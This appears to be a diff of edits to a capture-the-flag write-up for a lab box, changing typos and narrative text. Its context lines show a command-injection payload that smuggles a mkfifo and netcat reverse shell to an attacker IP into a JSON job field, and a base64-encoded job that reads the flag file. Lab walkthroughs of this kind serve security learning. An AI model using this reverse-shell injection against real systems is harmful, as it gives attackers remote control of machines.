@@ -96,9 +96,9 @@ Let’s try the JSON format we received in the heartbeat message. Submitting
 
 returns
 
-`{"job_id": 0, "cmd": "ls", "success": true, "result": "[products.py](http://products.py/)\nuser.txt\n"}`
+`{"job_id": 0, "cmd": "ls", "success": true, "result": "products.py\nuser.txt\n"}`
 
-lets grab that flag right now!
+Oh, we've found the first flag already, let's grab it right now!
 
 `echo '{"job_id": 0, "cmd": "cat user.txt"}' | base64 > get-job/ImxhdGVzdCI=`
 
@@ -106,7 +106,7 @@ lets grab that flag right now!
 
 # Initial Shell
 
-Some of the more popular shells don’t seem to work on this box but eventualll we find one that does.  
+Some of the more popular shells don’t seem to work on this box but eventually we find one that does.  
 
 ```json
 {"job_id": 0, "cmd": "127.0.0.1 && rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.6.74.177 4444 >/tmp/f"}
@@ -133,7 +133,7 @@ for product in cursor.fetchall():
     print(f'We have {product[2]}x {product[1]}')
 ```
 
-We enumerate the database locally using the credentuals here but find nothing interesting. 
+We enumerate the database locally using the credentuals here but find nothing interesting. The credentials also don't work to `sudo` or `su` to any of our other users. 
 
 We also have a hidden directory `.implant` off of our home. 
 
@@ -258,7 +258,7 @@ if __name__ == "__main__":
 
 ```
 
-In fi’s home directory 
+Enumerating fi’s home directory we can see that he has `sudo` permissions. This looks like a good account to transition to if we can find a path.  
 
 ```bash
 ada@forgottenimplant:/home/fi$ ls -la
